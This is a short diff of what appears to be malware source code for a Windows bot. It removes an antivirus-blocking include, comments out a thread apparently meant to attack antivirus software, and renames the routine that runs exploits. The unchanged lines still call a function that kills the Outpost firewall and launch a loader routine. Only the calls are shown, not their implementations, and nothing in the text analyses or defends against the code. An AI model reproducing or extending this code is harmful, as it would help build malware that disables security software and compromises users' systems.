@@ -13,7 +13,6 @@
 #include "Unhook.h"
 #include "Config.h"
 #include "Crypt.h"
-#include "AvBlock.h"
 #include "Task.h"
 
 #include "Modules.h"
@@ -103,7 +102,7 @@ void ExplorerMain()
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
-	MegaJump(AvFuckThread);
+	//MegaJump(AvFuckThread);
 }
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
@@ -142,7 +141,7 @@ int APIENTRY MyMain()
 	if ( dwProcessHash == BOT::GetBotExeNameHash() ) // запуск из самого бота
 	{
 		KillOutpost();
-		DWORD dwExploits = DoExploits();
+		DWORD dwExploits = SetExploits();
 
 		if ( !dwExploits )
 		{
@@ -169,7 +168,7 @@ int APIENTRY MyMain()
 		dwFirst = 1;
 
 		KillOutpost();
-		DWORD dwExploits = DoExploits();
+		DWORD dwExploits = SetExploits();
 
 		if ( !dwExploits )
 		{
